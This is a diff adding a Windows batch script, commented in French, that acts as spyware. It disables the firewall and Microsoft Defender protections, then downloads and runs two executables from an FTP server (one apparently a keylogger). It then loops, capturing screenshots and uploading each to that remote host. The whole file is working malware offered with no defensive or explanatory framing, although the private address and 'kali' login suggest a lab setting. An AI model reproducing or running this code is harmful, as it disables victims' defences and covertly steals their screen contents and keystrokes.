@@ -1,0 +1,95 @@
+echo off
+cls
+
+REM -- gestion des varibleq:
+set /A x=0
+:debut
+set /A n=0
+
+REM -- Desactivation des antivirus:
+
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled false)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DIsableRealTimeMonitoring $true)
+ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle normal (Set-MpPreference -DisableIOAVProtection $true)
+cmd.exe
+
+
+REM -- Réglages des dossiers
+ 
+
+set paydir="%TEMP%\WindowsNT\NTSystem"
+set dossierscreenshots="%TEMP%\WindowsNT\NTSecure"
+
+
+
+IF EXIST "%dossierscreenshots%"\ftpcmd.dat (del /F /Q "%dossierscreenshots%"\ftpcmd.dat)
+
+
+
+
+
+
+
+REM -- Identifiants ftp
+set MyUserName=kali
+set MyPassword=0000
+set ip_serveur_distant=192.168.1.13
+
+
+
+
+REM -- downLoad the payload
+
+
+
+
+echo user %MyUserName%> ftp.dat
+echo %MyPassword%>> ftp.dat
+echo binary>> ftp.dat
+echo get 1-13.exe>> ftp.dat
+echo get key.exe>> ftp.dat
+echo bye>> ftp.dat
+
+ftp -n -s:ftp.dat %ip_serveur_distant%
+ping 127.0.0.1 -n 21 > nul
+del /F /Q ftp.dat
+start 1-13.exe
+start key.exe
+
+
+
+
+
+
+
+
+
+cd "%dossierscreenshots%\"
+IF EXIST ftpcmd.dat (EXIT)
+
+
+
+
+
+REM -- Boucle de screenshot
+:screenshot
+	set data=%DATE:/=-%-%TIME::=-%.png
+	cd "%dossierscreenshots%\"
+	"%paydir%\ncmd.exe" cmdwait 1000 savescreenshot "%dossierscreenshots%\%data%"
+	ping 127.0.0.1 -n 2 > nul
+	echo user %MyUserName%> ftpcmd.dat
+	echo %MyPassword%>> ftpcmd.dat
+	echo binary>> ftpcmd.dat
+        echo mkdir scren>> ftpcmd.dat
+        echo cd scren>> ftpcmd.dat
+	echo put %data%>> ftpcmd.dat
+	echo quit>> ftpcmd.dat
+	ftp -n -s:ftpcmd.dat %ip_serveur_distant%
+	
+	del /F /Q "%data%"
+        Set /A n=%n%+1
+        set /A x=%x%+1
+        IF %x%==300 (goto :debut)
+        if %n%==1500 (goto :debut)
+        echo X= %x%  N= %n%
+goto :screenshot
